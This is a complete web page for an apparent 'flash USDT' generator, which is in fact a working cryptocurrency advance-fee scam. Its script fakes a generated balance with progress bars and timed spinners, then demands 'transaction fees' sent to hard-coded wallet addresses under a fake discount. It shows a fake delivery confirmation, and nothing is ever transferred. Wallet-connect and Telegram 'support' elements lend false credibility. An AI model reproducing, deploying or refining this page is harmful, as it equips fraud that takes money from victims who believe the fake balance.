<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AITRO - Web3 USDT Transfer Tool</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Readex+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
  <style>
    /* All CSS is unchanged */
    :root { --primary-color: #39D3BB; --primary-glow: rgba(57, 211, 187, 0.5); --bg-color: #0D1117; --surface-color: #161B22; --border-color: #30363d; --text-color: #e0e0e0; --text-muted-color: #8b949e; --danger-color: #f44336; --success-color: #28a745; }
    @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
    @keyframes toast-in-out { 0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0; } 15% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 85% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(0.9); opacity: 0; } }
    @keyframes pan-animation { 0% { transform: translateX(-15px); } 100% { transform: translateX(15px); } }
    @keyframes glow-animation { 0% { text-shadow: 0 0 15px rgba(244, 67, 54, 0.8); } 33% { text-shadow: 0 0 15px rgba(33, 150, 243, 0.8); } 66% { text-shadow: 0 0 15px rgba(57, 211, 187, 0.9); } 100% { text-shadow: 0 0 15px rgba(244, 67, 54, 0.8); } }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Readex Pro', sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
    .main-header { width: 100%; text-align: center; margin-bottom: 40px; position: relative; }
    .usdt-logo { position: absolute; top: 0; right: 20px; /* Adjusted for LTR */ height: 50px; opacity: 0.8; }
    .main-title { font-size: 2.8rem; font-weight: 700; color: var(--text-color); animation: pan-animation 6s ease-in-out infinite alternate, glow-animation 5s linear infinite; }
    .view { display: none; }
    .view.active { display: block; width: 100%; max-width: 700px; }
    .auth-box { background-color: var(--surface-color); width: 100%; max-width: 420px; margin: auto; padding: 40px; border-radius: 16px; border: 1px solid var(--border-color); box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2); animation: fadeIn 0.5s ease-out; box-sizing: border-box;}
    .auth-box h1 { color: var(--primary-color); text-shadow: 0 0 10px var(--primary-glow); font-size: 2.2rem; margin-bottom: 30px; text-align: center; }
    .form-container { animation: fadeIn 0.3s ease-in-out; }
    .input-wrapper { position: relative; margin-bottom: 20px; }
    .input-wrapper i { position: absolute; top: 50%; left: 15px; /* Adjusted for LTR */ transform: translateY(-50%); color: var(--text-muted-color); }
    .input-field { width: 100%; background-color: var(--bg-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 13px 20px 13px 45px; /* Adjusted for LTR */ color: var(--text-color); font-size: 1rem; font-family: 'Readex Pro', sans-serif; transition: all 0.3s; box-sizing: border-box; }
    .input-field::placeholder { color: var(--text-muted-color); }
    .input-field:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 0 0 3px var(--primary-glow); }
    .action-button { width: 100%; padding: 13px; background-color: var(--primary-color); color: var(--bg-color); border: none; border-radius: 50px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
    .action-button:hover:not(:disabled) { box-shadow: 0 0 15px var(--primary-glow); transform: translateY(-2px); }
    .action-button:disabled { background-color: #272c33; color: var(--text-muted-color); cursor: not-allowed; transform: none; box-shadow: none; }
    .toggle-link { text-align: center; margin-top: 30px; font-size: 0.95rem; color: var(--text-muted-color); }
    .toggle-link span { color: var(--primary-color); font-weight: 600; cursor: pointer; }
    #app-view { background-color: var(--surface-color); padding: 30px; border-radius: 16px; border: 1px solid var(--border-color); animation: fadeIn 0.5s ease-out; box-sizing: border-box;}
    .app-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; flex-wrap: wrap-reverse; gap: 15px; }
    .balance-display-pill { background-color: var(--primary-color); color: var(--bg-color); padding: 8px 20px; border-radius: 50px; font-weight: 600; display: flex; align-items: center; gap: 8px; box-shadow: 0 0 10px var(--primary-glow); }
    .flash-generator { margin-bottom: 20px; padding: 15px; border: 1px dashed var(--primary-color); border-radius: 8px; background-color: rgba(13, 17, 23, 0.5); }
    .flash-label { font-size: 0.9rem; margin-bottom: 10px; color: var(--text-color); text-align: center; }
    .flash-progress-bar-container { width: 100%; height: 10px; background-color: var(--bg-color); border-radius: 5px; overflow: hidden; }
    .flash-progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--primary-color) 0%, #80E8DD 100%); border-radius: 5px; transition: width 0.1s linear; }
    .modal { display: none; position: fixed; z-index: 10000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.7); animation: fadeIn 0.3s; }
    .modal-content { background-color: var(--surface-color); margin: 15% auto; padding: 30px; border: 1px solid var(--border-color); width: 90%; max-width: 500px; border-radius: 16px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5); text-align: center; box-sizing: border-box;}
    .modal-content h2 { color: var(--primary-color); }
    .fee-address-box { background: var(--bg-color); padding: 15px; border-radius: 8px; margin: 20px 0; display: flex; justify-content: space-between; align-items: center; word-break: break-all; text-align: left; }
    .copy-icon { cursor: pointer; color: var(--text-muted-color); transition: color 0.2s; margin-left: 10px; }
    .copy-icon:hover { color: var(--primary-color); }
    .center-toast { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: var(--surface-color); padding: 25px 40px; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: 0 10px 40px rgba(0,0,0,0.5); z-index: 10001; font-size: 1.1rem; font-weight: 600; text-align: center; }
    #center-toast.show { display: block; animation: toast-in-out 3s ease-in-out forwards; }
    #center-toast i { color: var(--success-color); margin-right: 10px; }
    #processing-toast.show { display: flex; flex-direction: column; align-items: center; gap: 15px; animation: fadeIn 0.3s; }
    .spinner { border: 4px solid var(--border-color); border-top: 4px solid var(--primary-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
    #notification-area { position: fixed; bottom: 20px; right: 20px; /* Adjusted for LTR */ z-index: 99999; width: 90%; max-width: 350px; text-align: right; }
    .notification { padding: 15px; margin-top: 10px; border-radius: 8px; color: #fff; font-weight: 600; box-shadow: 0 5px 15px rgba(0,0,0,0.3); animation: fadeIn 0.5s; background-color: var(--surface-color); border-right: 5px solid var(--text-muted-color); border-left: none; }
    .notification.success { border-right-color: var(--success-color); }
    .notification.error { border-right-color: var(--danger-color); }
    .notification.info { border-right-color: #17a2b8; }
    
    /* == RESPONSIVE STYLES == */
    @media (max-width: 768px) {
      body {
        padding: 15px;
      }
      .main-header {
        margin-bottom: 30px;
      }
      .main-title {
        font-size: 2.2rem;
      }
      .usdt-logo {
        height: 40px;
        top: 5px;
        right: 15px;
      }
      .auth-box {
        padding: 30px 25px;
      }
      .auth-box h1 {
        font-size: 1.8rem;
      }
      #app-view {
        padding: 20px;
      }
      .app-header {
        flex-direction: column;
        align-items: center;
        gap: 20px;
      }
      .app-header > div:first-child {
        text-align: center;
      }
      .app-header > .action-button {
        width: auto;
        display: inline-block;
      }
      /* This targets the div holding the Connect & Logout buttons */
      #app-view div > div:has(#connect-wallet-btn) {
        flex-direction: column;
        gap: 15px;
      }
      #connect-wallet-btn,
      #app-view button[onclick="logout()"] {
        width: 100% !important; /* Override inline styles */
        margin: 0 !important;
      }
      .modal-content {
        margin: 20% auto;
        padding: 25px;
        width: 95%;
      }
      .fee-address-box {
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
        text-align: left;
      }
      .copy-icon {
        margin-left: 0;
      }
      #notification-area {
        width: calc(100% - 30px);
        right: 15px;
        left: 15px;
        bottom: 10px;
        text-align: left;
      }
    }
    @media (max-width: 480px) {
      .main-title {
        font-size: 1.8rem;
      }
      .auth-box h1 {
        font-size: 1.6rem;
      }
      .modal-content {
        margin-top: 25%;
      }
    }
  </style>
</head>
<body>

  <header class="main-header">
    <img src="https://cdn.worldvectorlogo.com/logos/tether.svg" alt="USDT Logo" class="usdt-logo">
    <h1 class="main-title">AITRO FLASH USDT</h1>
  </header>

  <div id="notification-area"></div>
  <div id="center-toast" class="center-toast"></div>
  <div id="processing-toast" class="center-toast"></div>
  
  <div id="feeModal" class="modal">
      <div class="modal-content">
          <h2 id="fee-modal-title">Confirm Fees</h2>
          <p id="fee-modal-text"></p>
          <div class="fee-address-box">
              <span id="fee-address"></span>
              <i class="fas fa-copy copy-icon" onclick="copyToClipboard(document.getElementById('fee-address').textContent)"></i>
          </div>
          <label for="receipt-upload" class="action-button">
            <i class="fas fa-paperclip"></i> Send Receipt
          </label>
          <input type="file" id="receipt-upload" style="display: none;" onchange="handleReceiptUpload(event)">
          <button id="confirm-fee-btn" class="action-button">I Have Sent The Fees</button>
      </div>
  </div>
  
  <div id="auth-view" class="view active">
    <div class="auth-box">
        <div id="login-container" class="form-container">
            <h1>Login</h1>
            <form onsubmit="handleLogin(event)">
                <div class="input-wrapper"><input type="email" id="login-email" class="input-field" placeholder="Email Address" required><i class="fas fa-envelope"></i></div>
                <div class="input-wrapper"><input type="password" id="login-password" class="input-field" placeholder="Password" required><i class="fas fa-lock"></i></div>
                <button type="submit" class="action-button">Login</button>
            </form>
            <p class="toggle-link">Don't have an account? <span onclick="toggleForms()">Create one now</span></p>
        </div>
        <div id="register-container" class="form-container" style="display: none;">
            <h1>Create Account</h1>
            <form onsubmit="handleRegister(event)">
                <div class="input-wrapper"><input type="text" id="register-username" class="input-field" placeholder="Username" required><i class="fas fa-user"></i></div>
                <div class="input-wrapper"><input type="email" id="register-email" class="input-field" placeholder="Email Address" required><i class="fas fa-envelope"></i></div>
                <div class="input-wrapper"><input type="password" id="register-password" class="input-field" placeholder="Password" required><i class="fas fa-lock"></i></div>
                <button type="submit" class="action-button">Create Account</button>
            </form>
            <p class="toggle-link">Already have an account? <span onclick="toggleForms()">Login</span></p>
        </div>
    </div>
  </div>
  
  <div id="app-view" class="view"></div>
  
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.9/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

  <script>
    const authView = document.getElementById('auth-view');
    const appView = document.getElementById('app-view');
    const loginContainer = document.getElementById('login-container');
    const registerContainer = document.getElementById('register-container');

    let provider, userAccount, loggedInUser = null, web3Modal, providerInstance;
    let generatedBalance = 0;

    const FEE_ADDRESSES = {
        bep20: '0x374756d81ccc0f8cad4e0863bb96ad5e1579f9cc',
        erc20: '0x374756d81ccc0f8cad4e0863bb96ad5e1579f9cc',
        trc20: 'TPowMg7Jd3DpwDggkoSzxuTU8pGTksdua8'
    };

    const simulatedBackend = {
        db: JSON.parse(localStorage.getItem('users_db')) || [],
        saveDb() { localStorage.setItem('users_db', JSON.stringify(this.db)); },
        register(u, e, p) { if (this.db.find(user => user.email === e)) return { success: false, message: 'This email is already in use.' }; this.db.push({ id: Date.now(), username: u, email: e, password: p }); this.saveDb(); return { success: true }; },
        login(e, p) { const user = this.db.find(u => u.email === e && u.password === p); return user ? { success: true, user } : { success: false, message: 'Invalid email or password.' }; }
    };
    
    const showView = (viewId) => { document.querySelectorAll('.view').forEach(v => v.classList.remove('active')); document.getElementById(viewId).classList.add('active'); };
    const toggleForms = () => { const isLoginVisible = loginContainer.style.display !== 'none'; loginContainer.style.display = isLoginVisible ? 'none' : 'block'; registerContainer.style.display = isLoginVisible ? 'block' : 'none'; };
    const handleRegister = (event) => { event.preventDefault(); const res = simulatedBackend.register(event.target.querySelector('#register-username').value, event.target.querySelector('#register-email').value, event.target.querySelector('#register-password').value); if (res.success) { showNotification('✅ Account created successfully!', 'success'); toggleForms(); event.target.reset(); } else { showNotification(`❌ ${res.message}`, 'error'); } };
    const handleLogin = async (event) => { event.preventDefault(); const res = simulatedBackend.login(document.getElementById('login-email').value, document.getElementById('login-password').value); if (res.success) { loggedInUser = res.user; sessionStorage.setItem('loggedInUser', JSON.stringify(loggedInUser)); initializeApp(); if (web3Modal.cachedProvider) await connectWallet(); } else { showNotification(`❌ ${res.message}`, 'error'); } };
    const logout = async () => { if (providerInstance && providerInstance.close) await providerInstance.close(); await web3Modal.clearCachedProvider(); sessionStorage.removeItem('loggedInUser'); loggedInUser = null; provider = null; userAccount = null; providerInstance = null; showView('auth-view'); showNotification('👋 Logged out successfully.', 'info'); };
    
    const initializeApp = () => {
        if (!loggedInUser) return;
        generatedBalance = parseFloat(localStorage.getItem(`genBalance_${loggedInUser.id}`)) || 0;
        appView.innerHTML = `
            <div class="app-header">
                <div style="display: flex; flex-direction: column; text-align: left;">
                    <span>Welcome, ${loggedInUser.username}!</span>
                    <span id="walletInfo" style="color: var(--text-muted-color); font-size: 0.9rem;">Wallet not connected</span>
                </div>
                <div class="balance-display-pill">
                    <span>Generated Balance:</span>
                    <strong id="generated-balance-amount">${generatedBalance.toFixed(2)}</strong>&nbsp;USDT
                </div>
                <a href="https://t.me/software_flash1" target="_blank" class="action-button" style="background: #2AABEE; color: white; width: auto; padding: 8px 15px; margin: 0; font-size: 0.9rem; text-decoration: none;">
                    <i class="fab fa-telegram-plane"></i> Support
                </a>
            </div>
            <div>
                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
                    <button id="connect-wallet-btn" class="action-button" style="width: 50%; margin: 0;" onclick="connectWallet()">🔗 Connect Wallet</button>
                    <button style="background: var(--danger-color); color: white; width: 50%; margin:0; padding: 13px; border-radius: 50px; border: none; cursor: pointer; font-weight: 600;" onclick="logout()">Logout</button>
                </div>
                <div class="input-wrapper"><select id="network" class="input-field"><option value="">-- Select Network --</option><option value="bep20">BEP20 (BSC)</option><option value="erc20">ERC20 (Ethereum)</option><option value="trc20">TRON (TRC20)</option></select></div>
                <div class="input-wrapper"><input type="text" id="recipientAddress" class="input-field" placeholder="Enter wallet address to receive flash"><i class="fas fa-wallet"></i></div>
                <div class="input-wrapper"><input type="number" id="amount" class="input-field" placeholder="Min 1,000 / Max 1B"><i class="fas fa-coins"></i></div>
                <div id="flash-generator" style="display: none;" class="flash-generator">
                    <div class="flash-label">Generating Flash... <span id="flash-progress-text">0%</span></div>
                    <div class="flash-progress-bar-container"><div id="flash-progress-bar" class="flash-progress-bar"></div></div>
                </div>
                <button class="action-button" id="generateBtn" onclick="handleGenerateFlash()">⚡ Generate</button>
                <button class="action-button" id="receiveBtn" onclick="handleReceiveFlash()">⚡ Receive Flash</button>
            </div>`;
        showView('app-view');
    };

    async function handleGenerateFlash() {
        const amountEl = document.getElementById("amount");
        const amount = parseFloat(amountEl.value);
        if (!amountEl.value || amount < 1000) {
            return showNotification("❌ Minimum generation amount is 1,000 USDT.", "error");
        }
        const generateBtn = document.getElementById("generateBtn");
        generateBtn.disabled = true;
        try {
            await startFlashGeneration();
            generatedBalance += amount;
            localStorage.setItem(`genBalance_${loggedInUser.id}`, generatedBalance);
            document.getElementById('generated-balance-amount').textContent = generatedBalance.toFixed(2);
            showCenterToast(`<i class="fas fa-check-circle"></i> Successfully generated ${amount.toFixed(2)} USDT`);
        } finally {
            generateBtn.disabled = false;
        }
    }

    function handleReceiveFlash() {
        if (generatedBalance < 1000) { return showNotification(`❌ Your generated balance is ${generatedBalance.toFixed(2)} USDT. Minimum withdrawal is 1,000 USDT.`, "error"); }
        if (generatedBalance > 1000000000) { return showNotification(`❌ Cannot withdraw more than 1,000,000,000 USDT at once.`, "error"); }
        const network = document.getElementById("network").value;
        const recipient = document.getElementById("recipientAddress").value;
        const isTronAddress = (addr) => addr && addr.length === 34 && addr.startsWith('T');
        const isEvmAddress = (addr) => addr && ethers.utils.isAddress(addr);
        if (!network || !recipient || (network === 'trc20' ? !isTronAddress(recipient) : !isEvmAddress(recipient))) {
            return showNotification("❌ Please select a network and enter a valid recipient address.", "error");
        }
        showProcessingToast('Processing your request...');
        setTimeout(() => {
            hideProcessingToast();
            let baseFee = (generatedBalance / 1000) * 50;
            let finalFee = baseFee;
            let discountApplied = false;
            if (generatedBalance > 3000) {
                finalFee = baseFee * 0.50;
                discountApplied = true;
            }
            const networkCurrency = {bep20: "BNB", erc20: "ETH", trc20: "TRX"};
            let modalText = `To receive ${generatedBalance.toFixed(2)} USDT, please send transaction fees of <strong>$${finalFee.toFixed(2)} in ${networkCurrency[network]}</strong>.`;
            if (discountApplied) {
                modalText += `<br><small style="color:var(--primary-color)">A 50% discount has been applied for amounts over 3,000 USDT!</small>`;
            }
            const modal = document.getElementById('feeModal');
            document.getElementById('fee-modal-text').innerHTML = modalText;
            document.getElementById('fee-address').textContent = FEE_ADDRESSES[network];
            document.getElementById('confirm-fee-btn').onclick = () => {
                modal.style.display = 'none';
                showNotification(`✅ Fees confirmed. The flash will be sent to your wallet within 5 minutes after verification.`, 'success');
                generatedBalance = 0;
                localStorage.setItem(`genBalance_${loggedInUser.id}`, generatedBalance);
                document.getElementById('generated-balance-amount').textContent = '0.00';
            };
            modal.style.display = 'block';
        }, 10000);
    }
    
    function handleReceiptUpload(event) {
        const file = event.target.files[0];
        if (file) {
            showNotification(`✅ Receipt "${file.name}" uploaded successfully.`, 'success');
        }
    }

    function showCenterToast(message) { const toast = document.getElementById('center-toast'); toast.innerHTML = message; toast.classList.add('show'); setTimeout(() => { toast.classList.remove('show'); }, 3000); }
    function showProcessingToast(title, subtitle) { const toast = document.getElementById('processing-toast'); toast.innerHTML = `<div class="spinner"></div><div><strong>${title}</strong>${subtitle ? `<br><small>${subtitle}</small>` : ''}</div>`; toast.classList.add('show'); }
    function hideProcessingToast() { document.getElementById('processing-toast').classList.remove('show'); }
    async function copyToClipboard(text) { try { await navigator.clipboard.writeText(text); showNotification('📋 Address copied!', 'info'); } catch (err) { showNotification('❌ Copy failed', 'error'); } }
    
    function startFlashGeneration() {
        return new Promise(resolve => {
            const generator = document.getElementById('flash-generator');
            const progressBar = document.getElementById('flash-progress-bar');
            const progressText = document.getElementById('flash-progress-text');
            generator.style.display = 'block';
            let progress = 0;
            const duration = 11000;
            const intervalTime = 50;
            const interval = setInterval(() => {
                progress += intervalTime;
                const percentage = Math.min(Math.floor((progress / duration) * 100), 100);
                progressBar.style.width = `${percentage}%`;
                progressText.textContent = `${percentage}%`;
                if (progress >= duration) {
                    clearInterval(interval);
                    generator.style.display = 'none';
                    resolve();
                }
            }, intervalTime);
        });
    }

    async function connectWallet() { try { providerInstance = await web3Modal.connect(); provider = new ethers.providers.Web3Provider(providerInstance, "any"); const accounts = await provider.listAccounts(); if (accounts.length > 0) { userAccount = accounts[0]; document.getElementById("walletInfo").textContent = `Connected: ${userAccount.substring(0, 6)}...${userAccount.substring(userAccount.length - 4)}`; document.getElementById("recipientAddress").value = userAccount; const connectBtn = document.getElementById("connect-wallet-btn"); connectBtn.textContent = '✅ Connected'; connectBtn.disabled = true; showNotification("🎉 Wallet connected successfully!", "success"); } } catch (e) { showNotification("⚠️ Connection request was rejected.", "error"); } }
    function showNotification(message, type = "info") { const area = document.getElementById("notification-area"); if (!area) return; const notification = document.createElement("div"); notification.className = `notification ${type}`; notification.textContent = message; area.prepend(notification); setTimeout(() => { notification.style.transition = "opacity 0.5s, transform 0.5s"; notification.style.opacity = "0"; notification.style.transform = "translateX(20px)"; setTimeout(() => notification.remove(), 500); }, 5000); }
    
    window.onload = async () => {
        web3Modal = new Web3Modal.default({
            cacheProvider: true,
            providerOptions: {
                walletconnect: {
                    package: window.WalletConnectProvider.default,
                    options: { infuraId: "8043bb2cf99347b1bfadfb233c5325c0" }
                }
            }
        });
        const sessionUser = sessionStorage.getItem('loggedInUser');
        if (sessionUser) {
            loggedInUser = JSON.parse(sessionUser);
            initializeApp();
            if (web3Modal.cachedProvider) await connectWallet();
        } else {
            showView('auth-view');
        }
    };
  </script>
</body>
</html>
